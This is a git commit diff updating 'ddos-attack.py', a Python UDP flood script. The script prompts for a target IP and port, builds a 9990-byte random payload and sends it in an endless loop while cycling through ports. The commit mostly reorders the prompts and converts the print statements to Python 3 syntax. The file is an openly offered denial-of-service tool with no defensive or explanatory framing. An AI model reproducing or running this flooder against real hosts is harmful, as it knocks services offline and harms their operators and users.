159b9ad5cc0eda1c891598bda8deceae046a04b9
whokilleddb <56482137+whokilleddb@users.noreply.github.com>
2020-04-11 00:46:40 +0530

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -4,34 +4,27 @@ import time
 import socket
 import random
 
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-
-
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(9990)
 
 
 os.system("clear")
-os.system("figlet DDos Attack")
-print
-ip = input("IP Target : ")
-port = input("Port       : ")
-
 os.system("clear")
 os.system("figlet Attack Starting")
 
-time.sleep(3)
+
+ip = input("IP Target : ")
+port = input("Port       : ")
+
+print("Starting Attack :")
+
+time.sleep(5)
+
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print ("Sent %s packet to %s throught port:%s" %(sent,ip,port))
      if port == 65534:
        port = 1
